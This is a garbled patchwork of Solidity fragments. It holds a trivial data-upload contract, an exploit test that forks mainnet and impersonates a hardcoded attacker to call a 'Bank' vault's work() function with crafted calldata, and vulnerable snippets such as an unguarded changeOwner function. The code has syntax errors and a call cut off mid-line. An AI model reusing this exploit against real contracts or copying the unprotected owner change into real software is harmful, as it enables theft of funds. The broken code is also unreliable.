
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function uploadData(string memory dataId, string memory metadata) public {
        require(bytes(dataId).length > 0, "Invalid data ID");
        emit DataUploaded(msg.sender, dataId);
    }
}
pragma solidity 0.8.10;

;
;
interface Bank {
    function work(uint256 id, address goblin, uint256 loan, uint256 maxReturn, bytes calldata data);
    external payable};
contract ContractTest is DSTest {
  Bank vault = Bank(0x67B66C99D3Eb37Fa76Aa3Ed1ff33E8e39F0b9c7A);
  IERC20 fakeToken  = IERC20(payable(0x2f755e8980f0c2E81681D82CCCd1a4BD5b4D5D46));
  address attacker = address(0xCB36b1ee0Af68Dce5578a487fF2Da81282512233);
  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
  function setUp() public {
    cheats.createSelectFork("mainnet", 12394009)};
  function testExploit() public {
    emit log_named_decimal_uint("[Start] ETH Balance of attacker",
            attacker.balance,
            18);
    bytes memory data = hex"0000000000000000000000081796c4602b82054a727527cd16119807b8c760800000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000600000000000000000000000002f755e8980f0c2e81681D82CCCd1a4BD5b4D5D4600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
    cheats.startPrank(0xCB36b1ee0Af68Dce5578a487fF2Da81282512233, 0xCB36b1ee0Af68Dce5578a487fF2Da81282512233);
    (bool success, bytes memory result) = address(0x2f755e8980f0c2E81681D82CCCd1a4BD5b4D5D46).call{value: 10
function changeOwner(address newOwner) public {
    owner = newOwner}
function withdrawExact() public {
    require(address(this).balance == 1 ether);
    payable(msg.sender).transfer(1 ether)}